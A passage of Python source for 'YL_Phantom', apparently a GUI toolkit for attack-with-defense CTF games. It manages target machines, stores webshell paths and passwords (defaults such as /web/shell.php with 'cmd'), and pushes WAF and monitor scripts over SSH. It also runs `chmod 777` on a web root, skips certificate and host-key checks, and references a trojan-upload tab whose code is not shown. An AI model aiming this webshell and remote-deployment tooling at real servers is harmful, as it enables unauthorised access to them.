                        dir_name = ntpath.basename(cfg['webdir'].rstrip('/')) or 'html'
                        stdin, stdout, stderr = ssh.exec_command(
                            f"tar czf - -C {parent_dir} {dir_name} 2>/dev/null", timeout=60)
                        data = stdout.read()
                        ssh.close()
                        if not data:
                            raise RuntimeError('远程tar无输出(目录可能不存在)')
                        with open(fpath, 'wb') as fh: fh.write(data)
                    else:
                        with tarfile.open(fpath, 'w:gz') as tar: tar.add(cfg['webdir'], arcname=os.path.basename(cfg['webdir']))
                    sz = os.path.getsize(fpath)
                    last_ok = fname
                    self.root.after(0, lambda fn=fname, s=sz: self.sb_lw.log(f'[OK] {fn} ({s/1024:.0f}KB)', 'ok'))
                    self.root.after(0, lambda fn=fname, d=bd: self.sb_last.config(text=f'{fn} @ {d}'))
                except Exception as e:
                    self.root.after(0, lambda e=e: self.sb_lw.log(f'[FAIL] 备份失败: {e}', 'fail'))
                for _ in range(interval * 60):
                    if not self.sb_running: break
                    time.sleep(1)
        threading.Thread(target=run, daemon=True).start()


# ============================================================
#  机子管理 (多目标)
# ============================================================
class MachinesTab:
    def __init__(self, parent, tabs_ref=None):
        self.parent = parent
        self.tabs_ref = tabs_ref
        self.cfg_file = os.path.join(CONFIG_DIR, 'machines.json')
        self.machines = self._load()
        self.build_ui()
        self.refresh()

    def _load(self):
        try:
            if os.path.exists(self.cfg_file):
                with open(self.cfg_file, encoding='utf-8') as f:
                    return json.load(f)
        except Exception: pass
        return []

    def _save(self):
        try:
            os.makedirs(os.path.dirname(self.cfg_file), exist_ok=True)
            with open(self.cfg_file, 'w', encoding='utf-8') as f:
                json.dump(self.machines, f, ensure_ascii=False, indent=2)
        except Exception as e:
            messagebox.showerror('错误', f'保存失败: {e}')

    def build_ui(self):
        f = tk.Frame(self.parent, bg='#070b14')
        f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        top = tb.Frame(f); top.pack(fill=tk.X, pady=4)
        tb.Button(top, text='\U00002795 保存当前连接', command=self.save_current, bootstyle='success').pack(side=tk.LEFT, padx=2)
        tb.Button(top, text='\U0001f4e5 加载选中到全局', command=self.load_selected, bootstyle='info').pack(side=tk.LEFT, padx=2)
        tb.Button(top, text='\U0001f5d1 删除选中', command=self.delete_selected, bootstyle='danger').pack(side=tk.LEFT, padx=2)
        tb.Button(top, text='\U0001f504 刷新', command=self.refresh).pack(side=tk.LEFT, padx=2)
        tb.Label(top, text='文件: ' + self.cfg_file, foreground='#6b7f9e').pack(side=tk.LEFT, padx=8)
        body = tb.Frame(f); body.pack(fill=tk.BOTH, expand=True)
        self.tree = tb.Treeview(body, columns=('name','ip','port','shell','pass','ssh_port','ssh_user'),
            show='headings', height=8)
        for col, txt, w in [('name','名称',130),('ip','IP',130),('port','Web端口',70),
                            ('shell','Shell',150),('pass','密码',100),('ssh_port','SSH端口',70),('ssh_user','SSH用户',70)]:
            self.tree.heading(col, text=txt); self.tree.column(col, width=w, anchor=tk.W)
        vsb = tb.Scrollbar(body, orient='vertical', command=self.tree.yview)
        self.tree.configure(yscrollcommand=vsb.set)
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True); vsb.pack(side=tk.RIGHT, fill=tk.Y)
        self.tree.bind('<Double-1>', lambda e: self.load_selected())
        tb.Label(f, text='\U0001f4a1 提示: 顶部全局连接栏填好目标后点"保存当前连接"入库; 选中后"加载到全局"一键切换并应用到各标签页',
            foreground='#6b7f9e').pack(fill=tk.X, pady=4)

    def refresh(self):
        for item in self.tree.get_children(): self.tree.delete(item)
        for m in self.machines:
            self.tree.insert('', 'end', values=(
                m.get('name',''), m.get('ip',''), m.get('port',''), m.get('shell',''),
                m.get('pass',''), m.get('ssh_port',''), m.get('ssh_user','')))

    def save_current(self):
        t = self.tabs_ref
        if not t: return
        ip = t.global_ip.get().strip()
        if not ip: messagebox.showwarning('提示', '请先在全局连接栏填写目标IP'); return
        name = simpledialog.askstring('机子名称', '输入一个名字 (如 team1 / 靶机2):', parent=self.parent)
        if not name: return
        for m in self.machines:
            if m.get('name') == name:
                self.machines.remove(m); break
        self.machines.append({
            'name': name, 'ip': ip, 'port': t.global_port.get().strip(),
            'shell': t.global_shell.get().strip(), 'pass': t.global_pass.get().strip(),
            'ssh_port': t.global_ssh_port.get().strip(), 'ssh_user': t.global_ssh_user.get().strip(),
        })
        self._save(); self.refresh()

    def load_selected(self):
        sel = self.tree.selection()
        if not sel:
            messagebox.showwarning('提示', '请先在列表选择一台机子'); return
        m = self.machines[self.tree.index(sel[0])]
        t = self.tabs_ref
        if not t: return
        t.global_ip.set(m.get('ip',''))
        t.global_port.set(m.get('port','80'))
        t.global_shell.set(m.get('shell','/shell.php'))
        t.global_pass.set(m.get('pass',''))
        t.global_ssh_port.set(m.get('ssh_port','2202'))
        t.global_ssh_user.set(m.get('ssh_user','ctf'))
        t._apply_conn()
        try: t.status_bar.config(text=f'\u2705 已加载机子: {m.get("name")} ({m.get("ip")})')
        except Exception: pass

    def delete_selected(self):
        sel = self.tree.selection()
        if not sel: return
        m = self.machines[self.tree.index(sel[0])]
        if messagebox.askyesno('删除', f'确认删除机子 "{m.get("name")}"？'):
            self.machines.remove(m); self._save(); self.refresh()


# ============================================================
#  主窗口
# ============================================================
# ============================================================
class AWDToolkit:
    def __init__(self):
        # ── 高DPI适配: 进程DPI感知(必须在创建窗口前) ──
        try:
            import ctypes
            try:
                ctypes.windll.shcore.SetProcessDpiAwareness(2)
            except Exception:
                ctypes.windll.user32.SetProcessDPIAware()
        except Exception:
            pass
        self.root = tb.Window(themename='cyborg')
        self.root.title('YL_Phantom v2.0 — AWD工具集成 | by Wwlsyl | 开源版')
        try:
            ipath = os.path.join(BASE, 'YL_Phantom', 'icon.png')
            if not os.path.exists(ipath): ipath = os.path.join(BASE, 'icon.png')
            if os.path.exists(ipath):
                ico = tk.PhotoImage(file=ipath)
                self.root.iconphoto(True, ico)
        except Exception: pass
        # 字体按系统 DPI 等比缩放 (如150%缩放时scaling=2.0)
        try:
            import ctypes
            dpi = ctypes.windll.user32.GetDpiForSystem()
            self.root.tk.call('tk', 'scaling', dpi / 72.0)
        except Exception:
            pass
        # 窗口尺寸按屏幕自适应, 避免内容超出屏幕被裁剪
        sw, sh = self.root.winfo_screenwidth(), self.root.winfo_screenheight()
        try:
            u = ctypes.windll.user32
            r = ctypes.wintypes.RECT()
            if u.SystemParametersInfoW(0x0030, 0, ctypes.byref(r), 0):  # SPI_GETWORKAREA
                wa_w, wa_h = r.right - r.left, r.bottom - r.top
                sw, sh = min(sw, wa_w), min(sh, wa_h)
        except Exception:
            pass
        w, h = min(1500, int(sw * 0.92)), min(1000, int(sh * 0.9))
        self.root.geometry('%dx%d+%d+%d' % (w, h, max(0, (sw - w) // 2), max(0, (sh - h) // 2)))
        self.root.minsize(1000, 700)
        self.root.protocol('WM_DELETE_WINDOW', self.on_close)
        style = tb.Style()
        self.root.option_add('*Text.background', '#0a0e17')
        self.root.option_add('*Text.foreground', '#c8d6f0')
        style.configure('Warn.TButton', foreground='#ffffff', background='#ff6b35')
        # ── Notebook 霓虹标签样式 ──
        style.configure('TNotebook', background=NEO['bg'], borderwidth=0)
        style.configure('TNotebook.Tab', background='#0a101e', foreground='#6b7f9e',
            padding=(14, 7), borderwidth=0, font=('微软雅黑', 9, 'bold'))
        style.map('TNotebook.Tab',
            background=[('selected', '#0d1526'), ('active', '#111c33')],
            foreground=[('selected', '#00d4ff'), ('active', '#d6e4ff')])
        style.configure('Treeview', background=NEO['card_bg'], fieldbackground=NEO['card_bg'],
            foreground=NEO['text'], borderwidth=0, font=('Consolas', 9))
        style.map('Treeview', background=[('selected', '#12365c')],
            foreground=[('selected', '#ffffff')])
        style.configure('TButton', font=('微软雅黑', 9))
        style.configure('TEntry', fieldbackground='#0a101e', foreground=NEO['text'], bordercolor=NEO['border'])

        # ── 顶部霓虹标题横幅 ──
        banner = tk.Frame(self.root, bg=NEO['bg'], height=58)
        banner.pack(fill=tk.X, padx=0, pady=0)
        banner.pack_propagate(False)
        # 左侧
        left = tk.Frame(banner, bg=NEO['bg'])
        left.pack(side=tk.LEFT, padx=(16, 0), pady=6)
        tk.Label(left, text='YL_PHANTOM', font=('微软雅黑', 18, 'bold'),
            fg='#e8f6ff', bg=NEO['bg']).pack(anchor=tk.W)
        tk.Label(left, text='AWD 渗透工具集成平台 v2.0', font=('微软雅黑', 9),
            fg='#6b7f9e', bg=NEO['bg']).pack(anchor=tk.W)
        # 右侧
        right = tk.Frame(banner, bg=NEO['bg'])
        right.pack(side=tk.RIGHT, padx=(0, 16), pady=6)
        tk.Label(right, text='SECURITY OPS CONSOLE', font=('微软雅黑', 9),
            fg='#00d4ff', bg=NEO['bg']).pack(anchor=tk.E)
        tk.Label(right, text='BY WWLSYL', font=('微软雅黑', 9),
            fg='#6b7f9e', bg=NEO['bg']).pack(anchor=tk.E)
        tk.Label(right, text='◉ ONLINE', font=('微软雅黑', 8),
            fg='#00ff9d', bg=NEO['bg']).pack(anchor=tk.E)
        # 顶部/底部发光线
        tk.Frame(banner, bg='#00d4ff', height=2).pack(side=tk.TOP, fill=tk.X)
        tk.Frame(banner, bg='#1b2a4a', height=1).pack(side=tk.BOTTOM, fill=tk.X)
        self.banner = banner

        # ── 全局连接栏 ──
        self.conn_frame = tk.Frame(self.root, bg=NEO['card_bg'], bd=0,
            highlightthickness=1, highlightcolor=NEO['border'], highlightbackground=NEO['border'])
        self.conn_frame.pack(fill=tk.X, padx=6, pady=(4,0))
        row1 = tk.Frame(self.conn_frame, bg=NEO['card_bg'])
        row1.pack(fill=tk.X)
        row2 = tk.Frame(self.conn_frame, bg=NEO['card_bg'])
        row2.pack(fill=tk.X, pady=(2, 2))

        tk.Label(row1, text='🌐 全局连接', fg=NEO['accent'], bg=NEO['card_bg'],
            font=('微软雅黑', 9, 'bold')).pack(side=tk.LEFT, padx=(6,2))
        # 连接模式
        self.global_conn_mode = tk.StringVar(value='webshell')
        for val, txt in [('webshell', 'WebShell'), ('ssh', 'SSH')]:
            tk.Radiobutton(row1, text=txt, variable=self.global_conn_mode,
                value=val, fg=NEO['text'], bg=NEO['card_bg'], activebackground=NEO['card_bg'],
                selectcolor='#0a101e', font=('微软雅黑', 8)).pack(side=tk.LEFT, padx=2)
        tk.Label(row1, text='目标:', fg=NEO['text_dim'], bg=NEO['card_bg'],
            font=('微软雅黑', 9)).pack(side=tk.LEFT, padx=(4,0))
        self.global_ip = tk.StringVar()
        tk.Entry(row1, textvariable=self.global_ip, width=12,
            bg='#0a101e', fg=NEO['text'], relief=tk.FLAT, insertbackground=NEO['accent'],
            font=('Consolas', 9), highlightthickness=1, highlightcolor=NEO['border']).pack(side=tk.LEFT, padx=2)
        tk.Label(row1, text='端口:', fg=NEO['text_dim'], bg=NEO['card_bg']).pack(side=tk.LEFT)
        self.global_port = tk.StringVar(value='80')
        tk.Entry(row1, textvariable=self.global_port, width=5,
            bg='#0a101e', fg=NEO['text'], relief=tk.FLAT, insertbackground=NEO['accent'],
            font=('Consolas', 9), highlightthickness=1, highlightcolor=NEO['border']).pack(side=tk.LEFT, padx=2)
        tk.Label(row1, text='Shell:', fg=NEO['text_dim'], bg=NEO['card_bg']).pack(side=tk.LEFT)
        self.global_shell = tk.StringVar(value='/web/shell.php')
        tk.Entry(row1, textvariable=self.global_shell, width=10,
            bg='#0a101e', fg=NEO['text'], relief=tk.FLAT, insertbackground=NEO['accent'],
            font=('Consolas', 9), highlightthickness=1, highlightcolor=NEO['border']).pack(side=tk.LEFT, padx=2)
        tk.Label(row1, text='密码:', fg=NEO['text_dim'], bg=NEO['card_bg']).pack(side=tk.LEFT)
        self.global_pass = tk.StringVar(value='cmd')
        tk.Entry(row1, textvariable=self.global_pass, width=8,
            bg='#0a101e', fg=NEO['text'], relief=tk.FLAT, insertbackground=NEO['accent'],
            font=('Consolas', 9), highlightthickness=1, highlightcolor=NEO['border']).pack(side=tk.LEFT, padx=2)
        tk.Label(row1, text='SSH端口:', fg=NEO['text_dim'], bg=NEO['card_bg']).pack(side=tk.LEFT)
        self.global_ssh_port = tk.StringVar(value='2202')
        tk.Entry(row1, textvariable=self.global_ssh_port, width=5,
            bg='#0a101e', fg=NEO['text'], relief=tk.FLAT, insertbackground=NEO['accent'],
            font=('Consolas', 9), highlightthickness=1, highlightcolor=NEO['border']).pack(side=tk.LEFT, padx=2)
        tk.Label(row1, text='SSH用户:', fg=NEO['text_dim'], bg=NEO['card_bg']).pack(side=tk.LEFT)
        self.global_ssh_user = tk.StringVar(value='ctf')
        tk.Entry(row1, textvariable=self.global_ssh_user, width=6,
            bg='#0a101e', fg=NEO['text'], relief=tk.FLAT, insertbackground=NEO['accent'],
            font=('Consolas', 9), highlightthickness=1, highlightcolor=NEO['border']).pack(side=tk.LEFT, padx=2)
        self.btn_apply = tk.Button(row1, text='📋 应用到当前标签', command=self._apply_conn,
            bg='#00d4ff', fg='#04121a', relief=tk.FLAT, bd=0, padx=8, pady=2, cursor='hand2',
            font=('微软雅黑', 8, 'bold'), activebackground='#00d4ff')
        self.btn_apply.pack(side=tk.LEFT, padx=6)
        # 第二行: 刷新状态 + 一键工作流 (独立一行, 避免被参数挤到屏幕外)
        self.btn_refresh_status = tk.Button(row2, text='🔄 刷新状态', command=self._refresh_status,
            bg=NEO['card_hi'], fg=NEO['text'], relief=tk.FLAT, bd=0, padx=8, pady=2, cursor='hand2',
            font=('微软雅黑', 8), activebackground='#1b2a4a')
        self.btn_refresh_status.pack(side=tk.LEFT, padx=4)
        self.btn_workflow = tk.Button(row2, text='⚡ 一键部署监控+WAF', command=self._one_click_workflow,
            bg='#7c5cff', fg='white', relief=tk.FLAT, bd=0, padx=8, pady=2, cursor='hand2',
            font=('微软雅黑', 8, 'bold'), activebackground='#8b6bff')
        self.btn_workflow.pack(side=tk.LEFT, padx=4)

        nb = tb.Notebook(self.root)
        nb.pack(fill=tk.BOTH, expand=True, padx=4, pady=(4,4))

        f0 = tk.Frame(nb, bg='#070b14'); nb.add(f0, text='  \U0001f4ca 总览  ')
        try:
            from dashboard import DashboardTab
            self.dash = DashboardTab(f0, tabs_ref=self)
        except Exception:
            self.dash = None
            tk.Label(f0, text='Dashboard 模块加载失败\n请检查 dashboard.py 是否存在', fg='#ff4d6d',
                bg='#070b14', font=('微软雅黑', 12)).pack(expand=True)

        f1 = tb.Frame(nb); nb.add(f1, text='  \U0001f6e1 WAF管理  ')
        self.waf = WafTab(f1, None)
        self.waf.root = self.root

        f2 = tb.Frame(nb); nb.add(f2, text='  \U0001f3af Flag获取  ')
        self.flag = FlagTab(f2, None)
        self.flag.root = self.root

        f3 = tk.Frame(nb, bg=MON_CK['bg']); nb.add(f3, text='  \U0001f4a1 靶机监控  ')
        self.mon = MonitorTab(f3, None)
        self.mon.root = self.root

        f4 = tb.Frame(nb); nb.add(f4, text='  \U0001f577 木马上传  ')
        self.creep = CreepTab(f4, None)
        self.creep.root = self.root

        f5 = tb.Frame(nb); nb.add(f5, text='  \U0001f527 综合运维  ')
        self.ops = OpsTab(f5, None)
        self.ops.root = self.root

        f6 = tk.Frame(nb, bg='#070b14'); nb.add(f6, text='  \U0001f5a5 机子管理  ')
        self.machines = MachinesTab(f6, tabs_ref=self)
        self.machines.root = self.root

        # 底部状态栏
        sep_bar = tk.Frame(self.root, bg='#1b2a4a', height=1)
        sep_bar.pack(fill=tk.X, padx=6)
        help_frame = tb.Frame(self.root)
        help_frame.pack(fill=tk.X, padx=8, pady=(4,6))
        try:
            avatar_img = tk.PhotoImage(file=os.path.join(BASE, '管理工具', 'Wwlsyl.png'))
            avatar_img = avatar_img.subsample(24, 24)
            avatar_lbl = tb.Label(help_frame, image=avatar_img)
            avatar_lbl.image = avatar_img
            avatar_lbl.pack(side=tk.LEFT, padx=(0,4))
        except Exception: pass
        tb.Label(help_frame, text='YL_Phantom v2.0 | by Wwlsyl | 开源版', font=('微软雅黑', 8), foreground='#6b7f9e').pack(side=tk.LEFT)
        self.status_bar = tb.Label(help_frame, text='', font=('微软雅黑', 8), foreground='#00d4ff')
        self.status_bar.pack(side=tk.LEFT, padx=8)
        tb.Button(help_frame, text='❓ 使用帮助', command=self.show_help).pack(side=tk.RIGHT)

        self.root.mainloop()

    def _apply_conn(self):
        """将全局连接参数应用到当前标签页"""
        tabs = [('WAF管理', self.waf), ('Flag获取', self.flag), ('靶机监控', self.mon),
                ('木马上传', self.creep)]
        ip = self.global_ip.get().strip()
        port = self.global_port.get().strip()
        shell = self.global_shell.get().strip()
        pwd = self.global_pass.get().strip()
        ssh_port = self.global_ssh_port.get().strip() or '2202'
        ssh_user = self.global_ssh_user.get().strip() or 'ctf'
        mode = self.global_conn_mode.get()
        for name, tab in tabs:
            if not tab: continue
            try:
                if hasattr(tab, 'e_ip') and ip: tab.e_ip.delete(0, tk.END); tab.e_ip.insert(0, ip)
                if hasattr(tab, 'e_port'): tab.e_port.delete(0, tk.END); tab.e_port.insert(0, port)
                if hasattr(tab, 'entry_port'): tab.entry_port.delete(0, tk.END); tab.entry_port.insert(0, port)
                if hasattr(tab, 'entry_shell') and shell: tab.entry_shell.delete(0, tk.END); tab.entry_shell.insert(0, shell)
                if hasattr(tab, 'e_surl') and shell: tab.e_surl.delete(0, tk.END); tab.e_surl.insert(0, shell)
                if hasattr(tab, 'e_shell_url') and shell: tab.e_shell_url.delete(0, tk.END); tab.e_shell_url.insert(0, shell)
                if hasattr(tab, 'entry_pass') and pwd: tab.entry_pass.delete(0, tk.END); tab.entry_pass.insert(0, pwd)
                if hasattr(tab, 'e_spass') and pwd: tab.e_spass.delete(0, tk.END); tab.e_spass.insert(0, pwd)
                if hasattr(tab, 'e_shell_pass') and pwd: tab.e_shell_pass.delete(0, tk.END); tab.e_shell_pass.insert(0, pwd)
                # WAF管理: 目标IP + SSH连接字段
                if hasattr(tab, 'e_target') and ip: tab.e_target.delete(0, tk.END); tab.e_target.insert(0, ip)
                if hasattr(tab, 'e_ssh_host') and ip: tab.e_ssh_host.delete(0, tk.END); tab.e_ssh_host.insert(0, ip)
                if hasattr(tab, 'e_ssh_port'): tab.e_ssh_port.delete(0, tk.END); tab.e_ssh_port.insert(0, ssh_port)
                if hasattr(tab, 'e_ssh_user'): tab.e_ssh_user.delete(0, tk.END); tab.e_ssh_user.insert(0, ssh_user)
                if hasattr(tab, 'e_ssh_pass') and pwd: tab.e_ssh_pass.delete(0, tk.END); tab.e_ssh_pass.insert(0, pwd)
                # 木马上传: 不强制同步模式, 保持用户选择
                if hasattr(tab, 'creep_conn_mode'):
                    if mode == 'ssh':
                        tab.creep_conn_mode.set('ssh')
                        if hasattr(tab, 'e_creep_ssh_host') and ip: tab.e_creep_ssh_host.delete(0, tk.END); tab.e_creep_ssh_host.insert(0, ip)
                        if hasattr(tab, 'e_creep_ssh_port'): tab.e_creep_ssh_port.delete(0, tk.END); tab.e_creep_ssh_port.insert(0, ssh_port)
                        if hasattr(tab, 'e_creep_ssh_user'): tab.e_creep_ssh_user.delete(0, tk.END); tab.e_creep_ssh_user.insert(0, ssh_user)
                        if hasattr(tab, 'e_creep_ssh_pass') and pwd: tab.e_creep_ssh_pass.delete(0, tk.END); tab.e_creep_ssh_pass.insert(0, pwd)
                    else:
                        # WebShell模式: 不填SSH字段, 但不清空已填的(用户可能自己维护)
                        pass
                if hasattr(tab, 'conn_mode'): tab.conn_mode.set(mode)
                if hasattr(tab, 'password') and pwd: tab.password.set(pwd)
                if hasattr(tab, 'target_url') and ip:
                    mon_path = '/target_monitor.php'
                    if shell and 'target_monitor.php' in shell: mon_path = shell
                    tab.target_url.set(f'http://{ip}:{port}{mon_path}')
                if hasattr(tab, '_switch_conn_mode'): tab._switch_conn_mode()
                if ip or pwd:
                    tab._prefill_ssh = {'host': ip, 'port': ssh_port, 'user': ssh_user, 'pwd': pwd,
                                        'webdir': getattr(tab, 'e_ssh_webdir', None) and tab.e_ssh_webdir.get().strip() or '/var/www/html'}
            except Exception:
                pass
        self.status_bar.config(text=f'✅ 已应用到 {len(tabs)} 个标签页')
        self._apply_conn_ops(ip, port, shell, pwd, ssh_port, ssh_user)

    def _apply_conn_ops(self, ip, port, shell, pwd, ssh_port, ssh_user):
        """将全局连接应用到综合运维(备份/数据库/加固/自动修复/黑名单/定时备份)"""
        ops = getattr(self, 'ops', None)
        if not ops: return
        def _set(w, val):
            try:
                if w is not None and val:
                    w.delete(0, tk.END); w.insert(0, val)
            except Exception: pass
        try:
            # 备份还原
            _set(getattr(ops, 'bak_ssh_host', None), ip)
            _set(getattr(ops, 'bak_ssh_port', None), ssh_port)
            _set(getattr(ops, 'bak_ssh_user', None), ssh_user)
            _set(getattr(ops, 'bak_ssh_pass', None), pwd)
            # 数据库
            _set(getattr(ops, 'db_ip', None), ip)
            _set(getattr(ops, 'db_ssh_port', None), ssh_port)
            _set(getattr(ops, 'db_ssh_user', None), ssh_user)
            _set(getattr(ops, 'db_ssh_pass', None), pwd)
            # 加固基线
            _set(getattr(ops, 'harden_ip', None), ip)
            _set(getattr(ops, 'harden_port', None), port)
            # 自动修复
            _set(getattr(ops, 'af_ip', None), ip)
            _set(getattr(ops, 'af_port', None), port)
            _set(getattr(ops, 'af_shell', None), shell)
            _set(getattr(ops, 'af_pass', None), pwd)
            # IP黑名单: ban_ip_entry=目标靶机, ban_target=要封禁的IP
            _set(getattr(ops, 'ban_ip_entry', None), ip)
            # 定时备份
            _set(getattr(ops, 'sb_ssh_host', None), ip)
            _set(getattr(ops, 'sb_ssh_port', None), ssh_port)
            _set(getattr(ops, 'sb_ssh_user', None), ssh_user)
            _set(getattr(ops, 'sb_ssh_pass', None), pwd)
            ops._prefill_ssh = {'host': ip, 'port': ssh_port, 'user': ssh_user, 'pwd': pwd,
                                'webdir': '/var/www/html'}
            # 同步连接模式到备份/定时备份
            try:
                mode = self.global_conn_mode.get()
                if hasattr(ops, 'bak_mode'):
                    ops.bak_mode.set('ssh' if mode == 'ssh' else 'local')
                    ops._switch_bak_mode()
                if hasattr(ops, 'sb_mode'):
                    ops.sb_mode.set('ssh' if mode == 'ssh' else 'local')
                    ops._switch_sb_mode()
            except Exception:
                pass
        except Exception:
            pass

    def _refresh_status(self):
        """刷新所有靶机状态（简化版）"""
        self.status_bar.config(text='🔄 正在刷新状态...')
        def _check():
            try:
                ip = self.global_ip.get().strip()
                if not ip: return
                # 快速检测各项服务
                import urllib.request, ssl
                ctx = ssl._create_unverified_context()
                results = []
                # 检测Web
                try:
                    r = urllib.request.urlopen(f'http://{ip}:80/', timeout=3, context=ctx)
                    results.append(f'Web:{"✅" if r.status==200 else "❌"}')
                except Exception:
                    try:
                        r = urllib.request.urlopen(f'http://{ip}:8804/', timeout=3, context=ctx)
                        results.append(f'Web:{"✅" if r.status==200 else "❌"}')
                    except Exception:
                        try:
                            r = urllib.request.urlopen(f'http://{ip}:8802/', timeout=3, context=ctx)
                            results.append(f'Web:{"✅" if r.status==200 else "❌"}')
                        except Exception:
                            results.append('Web:❌')
                # 检测SSH
                try:
                    import socket
                    s = socket.socket(); s.settimeout(3)
                    s.connect((ip, int(self.global_ssh_port.get().strip() or 2202))); s.close()
                    results.append('SSH:✅')
                except Exception:
                    results.append('SSH:❌')
                self.root.after(0, lambda: self.status_bar.config(text=' | '.join(results)))
            except Exception:
                self.root.after(0, lambda: self.status_bar.config(text='状态刷新失败'))
        import threading; threading.Thread(target=_check, daemon=True).start()

    def _one_click_workflow(self):
        """一键工作流：先弹SSH配置窗口, 确认后部署WAF+监控文件+开始监控"""
        pre = {
            'host': self.global_ip.get().strip(),
            'port': self.global_ssh_port.get().strip() or '2202',
            'user': self.global_ssh_user.get().strip() or 'ctf',
            'pwd': self.global_pass.get().strip(),
            'webdir': '/var/www/html',
        }
        ssh_deploy_dialog(self.root, '⚡ 一键部署监控+WAF', '输入SSH信息, 自动部署 target_monitor.php + WAF 并启动监控',
            [('SSH地址:', 'host', pre['host'], ''),
             ('SSH端口:', 'port', pre['port'], ''),
             ('用户名:', 'user', pre['user'], ''),
             ('密码:', 'pwd', pre['pwd'], '*'),
             ('Web目录:', 'webdir', pre['webdir'], '')],
            self._run_workflow)

    def _run_workflow(self, vals):
        host = vals.get('host') or self.global_ip.get().strip()
        port = self.global_port.get().strip() or '80'
        pwd = vals.get('pwd') or self.global_pass.get().strip()
        ssh_user = vals.get('user') or 'ctf'
        ssh_port_str = vals.get('port') or '2202'
        web_dir_input = vals.get('webdir') or '/var/www/html'
        if not host:
            messagebox.showerror('错误', '请先填写目标IP'); return
        self.status_bar.config(text='🚀 一键工作流启动...')
        self._log_workflow('🚀 一键工作流启动: SSH连接 %s:%s (用户 %s)' % (host, ssh_port_str, ssh_user))
        state = {'ssh': None}
        def _kill():
            try:
                if state['ssh']:
                    try: state['ssh'].close()
                    except Exception: pass
            except Exception: pass
            self.root.after(0, lambda: self.status_bar.config(text='❌ 部署超时(120s)已中断'))
        watchdog = threading.Timer(120, _kill)
        watchdog.daemon = True
        watchdog.start()
        def _run():
            try:
                import paramiko, os, time
                ssh = paramiko.SSHClient()
                state['ssh'] = ssh
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                last_err = None
                try:
                    ssh_port = int(ssh_port_str) if str(ssh_port_str).strip() else 2202
                except Exception:
                    ssh_port = 2202
                for attempt in range(3):
                    try:
                        ssh.connect(host, port=ssh_port, username=ssh_user, password=pwd, timeout=10,
                                    allow_agent=False, look_for_keys=False, banner_timeout=15)
                        break
                    except Exception as ce:
                        last_err = ce
                        time.sleep(2)
                else:
                    err_s = str(last_err); el = err_s.lower()
                    if 'timed out' in el or 'unreachable' in el or 'refused' in el or 'no route' in el:
                        raise RuntimeError(f'靶机不可达[{host}:{ssh_port}] 连接超时/被拒 — 靶机未启动或网络不通(非密码问题)')
                    if 'authentication' in el:
                        raise RuntimeError(f'SSH认证失败[{host}:{ssh_port} 用户:{ssh_user}] — 用户名或密码错误: {err_s[:50]}')
                    raise RuntimeError(f'SSH连接失败[{host}:{ssh_port}] (已重试3次): {err_s[:80]}')
                tr = ssh.get_transport()
                if tr:
                    tr.sock.settimeout(30)
                    tr.banner_timeout = 15
                sftp = None
                for attempt in range(3):
                    try:
                        sftp = ssh.open_sftp()
                        sftp.get_channel().settimeout(30)
                        break
                    except Exception as ce:
                        last_err = ce
                        time.sleep(2)
                if sftp is None:
                    raise RuntimeError(f'SFTP连接失败(已重试3次): {str(last_err)[:80]}')
                base = BASE
                report = []
                # 0. 探测远端Web目录（不存在则尝试创建）
                self.root.after(0, lambda: self.status_bar.config(text='🚀 探测Web目录...'))
                web_dir = web_dir_input
                detect_cmd = "for d in /app /app/web /var/www/html /var/www /web /www /opt/web /srv/www /home/ctf/web /home/ctf/www; do [ -d \"$d\" ] && echo \"$d\" && break; done"
                try:
                    _, so, _ = ssh.exec_command(detect_cmd, timeout=15)
                    so.channel.settimeout(15)
                    out = (so.read().decode('utf-8', 'replace') or '').strip().splitlines()
                    if out and out[0].strip():
                        web_dir = out[0].strip()
                    else:
                        _, so2, se2 = ssh.exec_command('mkdir -p /var/www/html && chmod 777 /var/www/html', timeout=15)
                        so2.channel.settimeout(15)
                        if so2.channel.recv_exit_status() != 0:
                            err2 = (se2.read().decode('utf-8', 'replace') or '').strip()
                            raise RuntimeError(f'无法创建 /var/www/html: {err2 or "权限不足"}')
                except Exception as de:
                    raise RuntimeError(f'Web目录探测失败: {str(de)[:60]}')
                web_dir = web_dir.rstrip('/')
                # 1. 部署target_monitor.php
                mon_php = os.path.join(base, '上传靶机', 'target_monitor.php')
                if os.path.exists(mon_php):
                    self.root.after(0, lambda: self.status_bar.config(text='🚀 部署监控脚本...'))
                    with open(mon_php, 'r', encoding='utf-8', errors='replace') as f: content = f.read()
                    content = content.replace('y|lladmin121.@ss', pwd)
                    content = content.replace("$P='1ffd501f923a54275c3137b6aa362627'", "$P='" + pwd + "'")
                    with sftp.open(f'{web_dir}/target_monitor.php', 'w') as fh:
                        fh.write(content)
                    report.append(f'✅ 监控脚本 -> {web_dir}')
                # 2. 部署WAF文件
                waf_php = os.path.join(base, '上传靶机', 'waf_strong.php')
                waf_dat = os.path.join(base, '上传靶机', '.waf.dat')
                if os.path.exists(waf_php):
                    self.root.after(0, lambda: self.status_bar.config(text='🚀 部署WAF...'))
                    waf_content = render_waf_strong()
                    if waf_content is None:
                        with open(waf_php, 'r', encoding='utf-8', errors='replace') as f: waf_content = f.read()
                    with sftp.open(f'{web_dir}/waf_strong.php', 'w') as f:
                        f.write(waf_content)
                    report.append('✅ WAF文件')
                dat_content = None
                try:
                    dat_content = self.waf.build_waf_dat()
                except Exception:
                    pass
                if dat_content is None and os.path.exists(waf_dat):
                    with open(waf_dat, 'r', encoding='utf-8', errors='replace') as f: dat_content = f.read()
                if dat_content:
                    with sftp.open(f'{web_dir}/.waf.dat.php', 'w') as f:
                        f.write(dat_content)
                    try:
                        sftp.remove(f'{web_dir}/.waf.dat')
                    except Exception:
                        pass
                    report.append('✅ WAF规则')
                # 2.1 部署 .user.ini + .htaccess 全局注入/加固
                try:
                    with sftp.open(f'{web_dir}/.user.ini', 'w') as f:
                        f.write('auto_prepend_file=waf_strong.php\n')
                    with sftp.open(f'{web_dir}/.htaccess', 'w') as f:
                        f.write(_waf_htaccess())
                except Exception:
                    pass
                # 2.2 部署waf_ban.php（IP黑名单CLI管理，供"综合运维->IP黑名单"使用）
                ban_content = render_waf_ban()
                if ban_content:
                    with sftp.open(f'{web_dir}/waf_ban.php', 'w') as f:
                        f.write(ban_content)
                    report.append('✅ 黑名单脚本')
                try:
                    _, bso, _ = ssh.exec_command(
